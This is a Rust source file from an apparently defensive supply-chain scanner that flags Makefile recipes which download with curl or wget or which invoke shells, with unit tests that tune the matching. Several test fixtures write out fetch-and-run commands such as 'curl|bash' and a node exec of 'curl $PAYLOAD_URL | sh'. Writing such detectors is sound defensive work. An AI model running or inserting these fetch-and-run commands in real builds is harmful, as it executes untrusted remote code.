use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
use crate::detectors::patterns::line_invokes_shell_or_interpreter;
use crate::findings::{
    ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};
use crate::services::artifact_orchestration::manifests::strip_inline_hash_comment;
use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestratorService};
use std::path::Path;

const MAKEFILE_REMOTE_DOWNLOAD_TOKENS: &[&str] = &["curl", "wget"];

pub(crate) fn analyze_makefile(path: &Path, content: &str) -> Vec<Finding> {
    let artifact_path = path.display().to_string();
    let mut findings = Vec::new();
    for line in content.lines().map(str::trim) {
        let code = strip_inline_hash_comment(line);
        let lower = code.to_ascii_lowercase();
        if makefile_has_remote_download(&lower) {
            findings.push(
                Finding::builder(
                    "MANIFEST_MAKEFILE_REMOTE_DOWNLOAD",
                    ThreatCategory::SupplyChain,
                )
                .severity(Severity::Medium)
                .action(RecommendedAction::RequireApproval)
                .evidence_kind(EvidenceKind::Behavior)
                .matched_on(MatchTarget::ReferencedFile {
                    path: artifact_path.clone(),
                })
                .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                .match_value(line)
                .reason("Makefile performs remote downloads")
                .build(),
            );
        }
    }
    findings
}

pub(crate) fn makefile_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
    let mut has_network = false;
    let mut has_exec = false;
    for line in content.lines() {
        let code = strip_inline_hash_comment(line.trim_start());
        let lower = code.to_ascii_lowercase();
        if !has_network && makefile_has_remote_download(&lower) {
            has_network = true;
        }
        if !has_exec && line_invokes_shell_or_interpreter(&lower) {
            has_exec = true;
        }
    }
    let mut capabilities = Vec::new();
    if has_network {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::NetworkAccess,
        ));
    }
    if has_exec {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::ProcessExecution,
        ));
    }
    capabilities
}

pub(crate) fn makefile_relations(content: &str) -> Vec<ArtifactLink> {
    let mut links = Vec::new();
    for line in content.lines().map(str::trim) {
        let code = strip_inline_hash_comment(line);
        let lower = code.to_ascii_lowercase();
        if makefile_has_remote_download(&lower) {
            links.push(ArtifactLink {
                target: "remote-resource".to_string(),
                relation: ArtifactRelation::Downloads,
            });
        }
        if line_invokes_shell_or_interpreter(&lower) {
            links.push(ArtifactLink {
                target: code.to_string(),
                relation: ArtifactRelation::Executes,
            });
        }
    }
    links
}

fn makefile_has_remote_download(lower_line: &str) -> bool {
    MAKEFILE_REMOTE_DOWNLOAD_TOKENS
        .iter()
        .any(|token| command_token_with_boundary(lower_line, token))
}

fn command_token_with_boundary(lower_line: &str, token: &str) -> bool {
    let mut start = 0;
    while let Some(pos) = lower_line[start..].find(token) {
        let abs_pos = start + pos;
        let token_end = abs_pos + token.len();
        let before = if abs_pos > 0 {
            lower_line.as_bytes().get(abs_pos - 1)
        } else {
            None
        };
        let make_prefix_ok = matches!(before, Some(b'@' | b'-' | b'+'))
            && lower_line
                .as_bytes()
                .get(..abs_pos)
                .is_some_and(|prefix| prefix.iter().all(|b| matches!(b, b'@' | b'-' | b'+')));
        let left_ok = before.is_none()
            || make_prefix_ok
            || matches!(
                before,
                Some(b' ')
                    | Some(b'\t')
                    | Some(b'|')
                    | Some(b';')
                    | Some(b'&')
                    | Some(b'/')
                    | Some(b'(')
                    | Some(b'"')
                    | Some(b'\'')
                    | Some(b'`')
            );
        let after = lower_line.get(token_end..).unwrap_or("");
        let right_ok = after.is_empty()
            || after.starts_with(' ')
            || after.starts_with('\t')
            || after.starts_with('|')
            || after.starts_with(';')
            || after.starts_with('&')
            || after.starts_with('>')
            || after.starts_with('<');
        if left_ok && right_ok {
            return true;
        }
        start = token_end;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    fn capability_present(caps: &[ArtifactCapabilityFact], target: ArtifactCapability) -> bool {
        caps.iter().any(|fact| fact.capability == target)
    }

    fn relation_target_present(links: &[ArtifactLink], substring: &str) -> bool {
        links.iter().any(|link| link.target.contains(substring))
    }

    /// Contract: a Make recipe that invokes `bash` produces ProcessExecution.
    #[test]
    fn makefile_capabilities_detects_bash_recipe() {
        let content = "all:\n\tbash install.sh\n";
        let caps = makefile_capabilities(content);
        assert!(capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
    }

    /// Contract: Make recipe prefixes do not hide shell interpreter
    /// invocations.
    #[test]
    fn makefile_capabilities_detects_prefixed_bash_recipe() {
        let content = "all:\n\t@bash install.sh\n";
        let caps = makefile_capabilities(content);
        assert!(capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
    }

    /// Contract: a Make recipe that invokes bare `sh` at column 0 (after
    /// the recipe indent) produces ProcessExecution. Anchors the
    /// column-0 fix in the new helper.
    #[test]
    fn makefile_capabilities_detects_sh_recipe() {
        let content = "all:\n\tsh install.sh\n";
        let caps = makefile_capabilities(content);
        assert!(capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
    }

    /// Contract: a Make recipe that prints `Publish docs` must NOT produce
    /// ProcessExecution — the word `publish` used to falsely match the
    /// `"sh "` substring. Anchors the false-positive fix.
    #[test]
    fn makefile_capabilities_skips_publish_recipe() {
        let content = "publish:\n\t@echo \"Publish docs\"\n";
        let caps = makefile_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
    }

    /// Contract: `Finish setup` and similar English words must NOT produce
    /// ProcessExecution.
    #[test]
    fn makefile_capabilities_skips_finish_step() {
        let content = "ready:\n\t@echo \"Finish setup\"\n";
        let caps = makefile_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
    }

    /// Contract: an interpreter name printed by `echo` is data, not an
    /// executed command.
    #[test]
    fn makefile_capabilities_rejects_echoed_interpreter_argument() {
        let content = "ready:\n\t@echo bash install.sh\n";
        let caps = makefile_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
    }

    /// Contract: comment-only lines are filtered by the existing comment
    /// guard and never contribute to the capability set, even if the
    /// comment text contains `bash`.
    #[test]
    fn makefile_capabilities_skips_pure_comment_lines() {
        let content = "# bash this script later\nall:\n\t@echo done\n";
        let caps = makefile_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
    }

    /// Contract: column-0 `sh install.sh` produces an Executes relation
    /// (anchors the same column-0 fix on the relations side).
    #[test]
    fn makefile_relations_detects_sh_recipe() {
        let content = "all:\n\tsh install.sh\n";
        let links = makefile_relations(content);
        assert!(relation_target_present(&links, "sh install.sh"));
    }

    /// Contract: Make recipe prefixes do not hide shell interpreter
    /// relations.
    #[test]
    fn makefile_relations_detects_prefixed_bash_recipe() {
        let content = "all:\n\t@bash install.sh\n";
        let links = makefile_relations(content);
        assert!(relation_target_present(&links, "@bash install.sh"));
    }

    /// Contract: an interpreter name printed by `echo` is data, not an
    /// Executes relation.
    #[test]
    fn makefile_relations_rejects_echoed_interpreter_argument() {
        let content = "ready:\n\t@echo bash install.sh\n";
        let links = makefile_relations(content);
        assert!(!relation_target_present(&links, "echo bash"));
    }

    /// Contract: a `Publish docs` recipe must NOT produce an Executes
    /// relation.
    #[test]
    fn makefile_relations_skips_publish_recipe() {
        let content = "publish:\n\t@echo \"Publish docs\"\n";
        let links = makefile_relations(content);
        assert!(!relation_target_present(&links, "Publish docs"));
        assert!(!relation_target_present(&links, "publish"));
    }

    /// Contract: an inline `# ...` comment that mentions `curl` must NOT
    /// produce a `MANIFEST_MAKEFILE_REMOTE_DOWNLOAD` finding. The pre-fix
    /// code only suppressed full-line comments (lines whose first
    /// non-whitespace char was `#`); a recipe with a trailing comment
    /// referring to a removed `curl` invocation would still match the
    /// `"curl "` substring.
    #[test]
    fn analyze_makefile_ignores_curl_in_inline_comment() {
        let content = "all:\n\t@echo ready  # was: curl https://old\n";
        let findings = analyze_makefile(Path::new("Makefile"), content);
        assert!(
            findings.is_empty(),
            "inline `# ... curl ...` comment must not raise a finding; got: {findings:?}",
        );
    }

    /// Contract: an actual `curl` invocation followed by an inline
    /// comment still raises the finding. Anchors that the inline-comment
    /// stripper does not over-apply and erase real evidence preceding
    /// the `#`.
    #[test]
    fn analyze_makefile_detects_curl_with_trailing_comment() {
        let content = "all:\n\tcurl https://x  # download bootstrap\n";
        let findings = analyze_makefile(Path::new("Makefile"), content);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "MANIFEST_MAKEFILE_REMOTE_DOWNLOAD");
    }

    /// Contract: pipe-joined download commands are still command
    /// invocations even when there is no trailing space after `curl`.
    #[test]
    fn analyze_makefile_detects_pipe_joined_curl() {
        for content in [
            "all:\n\tcurl|bash\n",
            "all:\n\tnode -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
        ] {
            let findings = analyze_makefile(Path::new("Makefile"), content);
            assert_eq!(findings.len(), 1, "{content:?} must raise one finding");
            assert_eq!(findings[0].rule_id, "MANIFEST_MAKEFILE_REMOTE_DOWNLOAD");
        }
    }

    /// Contract: lookalike words containing `curl` or `wget` are not
    /// command invocations and must not raise download findings.
    #[test]
    fn analyze_makefile_rejects_remote_download_substrings() {
        for content in [
            "all:\n\t@echo uncurl prewget pre-wget\n",
            "all:\n\tnode -e \"require('child_process').exec('mycurl\t$PAYLOAD_URL')\"\n",
        ] {
            let findings = analyze_makefile(Path::new("Makefile"), content);
            assert!(
                findings.is_empty(),
                "lookalike words must not raise remote-download finding for {content:?}; got {findings:?}",
            );
        }
    }

    /// Contract: an inline comment mentioning `wget` does not flip the
    /// `NetworkAccess` capability flag.
    #[test]
    fn makefile_capabilities_skips_wget_in_inline_comment() {
        let content = "all:\n\t@echo done  # used to wget https://old\n";
        let caps = makefile_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::NetworkAccess
        ));
    }

    /// Contract: Make recipe prefixes and absolute command paths still
    /// count as real download invocations.
    #[test]
    fn makefile_capabilities_detects_prefixed_and_absolute_download_commands() {
        for content in [
            "all:\n\t@curl https://x\n",
            "all:\n\t-/usr/bin/wget https://x\n",
            "all:\n\tnode -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
        ] {
            let caps = makefile_capabilities(content);
            assert!(
                capability_present(&caps, ArtifactCapability::NetworkAccess),
                "download command in {content:?} must flip NetworkAccess; got {caps:?}",
            );
        }
    }

    /// Contract: boundary-aware detection applies to relations too.
    #[test]
    fn makefile_relations_detects_pipe_joined_download_command() {
        for content in [
            "all:\n\tcurl|bash\n",
            "all:\n\tnode -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
        ] {
            let links = makefile_relations(content);
            assert!(
                relation_target_present(&links, "remote-resource"),
                "{content:?} must produce a remote-resource relation; got {links:?}",
            );
        }
    }

    /// Contract: an inline comment mentioning `bash` does not flip
    /// `ProcessExecution`. Pre-fix the comment portion was lower-cased
    /// and substring-matched directly.
    #[test]
    fn makefile_capabilities_skips_bash_in_inline_comment() {
        let content = "all:\n\t@echo ok  # legacy: bash install.sh\n";
        let caps = makefile_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
    }

    /// Contract: an inline `curl` comment does not produce a Downloads
    /// relation either.
    #[test]
    fn makefile_relations_skips_curl_in_inline_comment() {
        let content = "all:\n\t@echo ready  # legacy curl https://x\n";
        let links = makefile_relations(content);
        assert!(!relation_target_present(&links, "remote-resource"));
    }
}
